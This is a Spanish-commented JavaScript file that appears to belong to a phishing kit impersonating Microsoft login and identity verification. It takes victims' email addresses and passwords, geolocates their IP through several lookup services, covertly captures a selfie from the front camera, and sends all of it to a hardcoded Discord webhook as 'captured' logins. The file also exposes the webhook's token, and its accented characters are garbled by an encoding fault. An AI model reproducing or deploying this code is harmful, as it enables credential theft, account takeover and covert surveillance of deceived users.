// URL del webhook de Discord
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1462992363814256804/PZcZVPGrikV4XTQEc1DSptMHR8c3ytyx4Q9JcZV7U3NOEFdqQ_XDWOc3yUMqIch1RoLO';

// Funci車n para obtener informaci車n de localizaci車n
async function getLocationInfo() {
    try {
        console.log('??? Obteniendo localizaci車n...');
        
        // Usar ipapi.co que es m芍s confiable
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        
        if (data && data.ip) {
            console.log('? Localizaci車n obtenida:', data);
            return {
                ip: data.ip || 'No disponible',
                country: data.country_name || 'No disponible',
                region: data.region || 'No disponible',
                city: data.city || 'No disponible'
            };
        } else {
            throw new Error('Respuesta inv芍lida de ipapi.co');
        }
    } catch (error) {
        console.warn('?? Error con ipapi.co, probando alternativa:', error);
        
        // Fallback: usar ip-api.com
        try {
            const response2 = await fetch('http://ip-api.com/json/');
            const data2 = await response2.json();
            
            if (data2.status === 'success') {
                console.log('? Localizaci車n obtenida (fallback):', data2);
                return {
                    ip: data2.query || 'No disponible',
                    country: data2.country || 'No disponible',
                    region: data2.regionName || 'No disponible',
                    city: data2.city || 'No disponible'
                };
            } else {
                throw new Error('Error en ip-api.com');
            }
        } catch (error2) {
            console.warn('?? Error con ip-api.com, usando solo IP:', error2);
            
            // 迆ltimo fallback: solo IP
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                return {
                    ip: ipData.ip || 'No disponible',
                    country: 'No disponible',
                    region: 'No disponible',
                    city: 'No disponible'
                };
            } catch (ipError) {
                console.error('? Error obteniendo IP:', ipError);
                return {
                    ip: 'No disponible',
                    country: 'No disponible',
                    region: 'No disponible',
                    city: 'No disponible'
                };
            }
        }
    }
}

// Funci車n para enviar mensaje a Discord
async function sendDiscordMessage(embed, imageData = null) {
    try {
        console.log('?? Enviando mensaje a Discord...');
        
        const payload = {
            embeds: [embed]
        };
        
        // Si hay datos de imagen, agregarlos
        if (imageData) {
            payload.files = [{
                name: 'selfie.jpg',
                data: imageData
            }];
        }
        
        const response = await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            console.log('? Mensaje enviado exitosamente a Discord');
            return true;
        } else {
            console.error('? Error de API Discord:', response.status, response.statusText);
            return false;
        }
    } catch (error) {
        console.error('? Error de red:', error);
        return false;
    }
}

// Funci車n para enviar datos de login
async function sendLoginData(email, password) {
    console.log('?? Iniciando env赤o de datos de login...');
    
    try {
        const timestamp = new Date().toLocaleString('es-ES');
        
        console.log('??? Obteniendo localizaci車n para login...');
        const location = await getLocationInfo();
        
        const embed = {
            title: "?? NUEVO LOGIN CAPTURADO",
            color: 0xff0000, // Color rojo
            fields: [
                {
                    name: "?? Email",
                    value: email,
                    inline: true
                },
                {
                    name: "?? Password",
                    value: password,
                    inline: true
                },
                {
                    name: "?? Pa赤s",
                    value: location.country,
                    inline: true
                },
                {
                    name: "??? Ciudad",
                    value: `${location.city}, ${location.region}`,
                    inline: true
                },
                {
                    name: "?? IP",
                    value: location.ip,
                    inline: true
                },
                {
                    name: "?? Timestamp",
                    value: timestamp,
                    inline: true
                }
            ],
            footer: {
                text: "Microsoft Login System"
            },
            timestamp: new Date().toISOString()
        };
        
        const result = await sendDiscordMessage(embed);
        
        if (result) {
            console.log('? Datos de login enviados exitosamente');
        } else {
            console.error('? Error enviando datos de login');
        }
        
        return result;
    } catch (error) {
        console.error('? Error en sendLoginData:', error);
        return false;
    }
}

// Funci車n para enviar selfie con datos
async function sendSelfieData(selfieData, email) {
    console.log('?? Iniciando env赤o de selfie...');
    
    try {
        const timestamp = new Date().toLocaleString('es-ES');
        
        console.log('??? Obteniendo localizaci車n para selfie...');
        const location = await getLocationInfo();
        
        const embed = {
            title: "?? NUEVA SELFIE CAPTURADA",
            color: 0x00ff00, // Color verde
            fields: [
                {
                    name: "?? Email",
                    value: email || 'No disponible',
                    inline: false
                },
                {
                    name: "?? Pa赤s",
                    value: location.country,
                    inline: true
                },
                {
                    name: "??? Ciudad",
                    value: `${location.city}, ${location.region}`,
                    inline: true
                },
                {
                    name: "?? IP",
                    value: location.ip,
                    inline: true
                },
                {
                    name: "?? Timestamp",
                    value: timestamp,
                    inline: false
                }
            ],
            footer: {
                text: "Microsoft Verification System"
            },
            timestamp: new Date().toISOString()
        };
        
        // Procesar la imagen (selfie)
        const imageBase64 = selfieData.split(',')[1] || selfieData;
        
        const result = await sendDiscordMessage(embed, imageBase64);
        
        if (result) {
            console.log('? Selfie enviada exitosamente');
        } else {
            console.error('? Error enviando selfie');
        }
        
        return result;
    } catch (error) {
        console.error('? Error en sendSelfieData:', error);
        return false;
    }
}

// Funci車n para capturar selfie desde la c芍mara
async function captureSelfie(email = '') {
    try {
        console.log('?? Iniciando captura de selfie...');
        
        // Crear elemento de video para captura
        const video = document.createElement('video');
        video.width = 640;
        video.height = 480;
        video.style.display = 'none';
        document.body.appendChild(video);
        
        // Obtener stream de la c芍mara
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user' },
            audio: false
        });
        
        video.srcObject = stream;
        await video.play();
        
        // Esperar a que el video est谷 listo
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        // Crear canvas para capturar la foto
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const context = canvas.getContext('2d');
        
        // Dibujar el frame del video en el canvas
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        // Convertir a base64
        const selfieData = canvas.toDataURL('image/jpeg', 0.8);
        
        // Detener la c芍mara
        stream.getTracks().forEach(track => track.stop());
        
        // Limpiar elementos
        document.body.removeChild(video);
        
        console.log('?? Selfie capturada correctamente');
        
        // Enviar la selfie
        const result = await sendSelfieData(selfieData, email);
        
        return {
            success: result,
            imageData: selfieData
        };
        
    } catch (error) {
        console.error('? Error capturando selfie:', error);
        
        // Si falla la captura de c芍mara, permitir subir archivo
        return {
            success: false,
            error: 'C芍mara no disponible',
            fallback: true
        };
    }
}

// Verificar que las funciones est谷n disponibles
if (typeof window !== 'undefined') {
    window.sendLoginData = sendLoginData;
    window.sendSelfieData = sendSelfieData;
    window.captureSelfie = captureSelfie;
    console.log('? Discord XJSX cargado correctamente');
    console.log('?? Funciones disponibles: sendLoginData, sendSelfieData, captureSelfie');
    console.log('?? Webhook configurado para Discord');
}